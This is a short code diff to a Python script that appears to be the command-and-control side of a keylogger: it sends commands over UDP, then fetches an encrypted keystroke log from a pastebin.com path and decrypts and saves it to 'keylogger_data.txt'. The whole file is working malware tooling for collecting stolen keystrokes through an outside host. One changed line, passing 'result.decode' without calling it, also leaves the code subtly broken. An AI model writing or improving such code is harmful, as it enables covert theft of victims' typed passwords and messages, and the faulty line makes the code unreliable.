@@ -7,14 +7,14 @@ from Crypto.Cipher import AES, PKCS1_OAEP
 # decrypts input string using our private key
 def decrypt(ciphertext):
     # convert string to bytes object
-    data = ciphertext.decode()
+    data = ciphertext
 
     # Read private key
     pkey = RSA.importKey(open('private.pem').read())
     cipher2 = PKCS1_OAEP.new(pkey)
     result = cipher2.decrypt(data)
     outfile = open("./keylogger_data.txt", "w")  # save decryption to file
-    outfile.write(result.decode("utf-8"))
+    outfile.write(result.decode)
     print(result)  # print decryption
 
 
@@ -40,6 +40,7 @@ while True:
         sock.sendto(cmd.encode(), send_addr)
         if cmd == "stop":
             msg, send_addr = sock.recvfrom(64)
+            msg = "https://pastebin.com/"+msg
             encrypted_keylog = get(msg).text
             decrypt(encrypted_keylog)
             exit()
